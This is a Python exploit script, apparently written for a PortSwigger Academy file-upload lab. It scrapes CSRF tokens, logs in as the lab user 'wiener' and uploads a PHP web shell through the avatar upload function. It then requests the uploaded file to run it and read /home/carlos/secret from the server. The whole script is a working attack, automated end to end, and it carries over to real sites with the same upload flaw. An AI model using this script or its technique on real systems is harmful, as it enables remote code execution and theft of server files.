import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}


def get_csrf(url):
    login_path = "/login"
    response = requests.get(url + login_path, verify=False, proxies=proxies)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('input')["value"]
    session_cookie = response.cookies.get_dict()['session']
    return csrf_token,session_cookie


def do_login(url, csrf_token, session_cookie):
    login_path = "/login"
    params = {'csrf' : csrf_token, 'username' : 'wiener' , 'password' : 'peter'}
    cookies = {'session' : session_cookie}
    response = requests.post(url + login_path, cookies=cookies, data=params, allow_redirects=False, verify=False, proxies=proxies)
    session_cookie = response.cookies.get_dict()['session']
    return session_cookie

def get_my_account_csrf_token(url, logged_session_cookie):
    my_account_path = "/my-account"
    cookies = {'session' : logged_session_cookie}
    response = requests.get(url + my_account_path, cookies=cookies, verify=False, proxies=proxies)
    soup = BeautifulSoup(response.text, "html.parser")
    input_values = soup.find_all("input")[1]
    csrf_token = re.search(r"[a-z,A-Z,0-9]{32}", str(input_values))
    return csrf_token.group(0)

def upload_file(url, logged_session_cookie, csrf_token_for_upload):
    path = "/my-account/avatar"
    cookies = {'session' : logged_session_cookie}
    params = {'csrf' : csrf_token_for_upload , 'user' : 'wiener'}
    files = {'avatar': open(r"C:\Users\acalarco\csec\web-pentest\portswigger-academy\file-upload\shell-lab01.php", "rb")}
    response = requests.post(url + path, cookies=cookies, data=params, files=files, verify=False, proxies=proxies)
    if response.status_code == 200 and "has been uploaded" in response.text:
        return True
    else:
        return False


def file_content(url):
    path = "/files/avatars/shell-lab01.php"
    response = requests.get(url + path, verify=False, proxies=proxies)
    return response.text


def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("[+] Testing for a file upload vulnerability in the avatar upload function for logged-in users.")
    print("[+] Retrieving 'CSRF TOKEN' and 'SESSION COOKIE' via GET request for /login page")
    csrf_token, session_cookie = get_csrf(url)
    print("[+] csrf_token = {0}\n[+] session_cookie = {1}".format(csrf_token, session_cookie))
    print("[+] Sending a POST login request and retrieving a new session cookie, valid for the logged-in user 'wiener'")
    logged_session_cookie = do_login(url, csrf_token, session_cookie)
    print("[+] logged_session_cookie = {0}".format(logged_session_cookie))
    print("[+] Sending a GET request for /my-account page and retrieving the 'CSRF TOKEN' needed to upload the file")
    csrf_token_for_upload = get_my_account_csrf_token(url, logged_session_cookie)
    print("[+] csrf_token for the upload function = {0}".format(csrf_token_for_upload))
    print("[+] Uploading a php file to the remote server to extract the content of /home/carlos/secret file")
    if not upload_file(url, logged_session_cookie, csrf_token_for_upload):
        print("[-] File upload failed")
        sys.exit(-1)
    print("[+] File uploaded!!\n[+] Executing the php script via GET request and fetching the content of the file")
    secret = file_content(url)
    print("[+] File content is %s" % secret)


    



if __name__ == "__main__":
    main()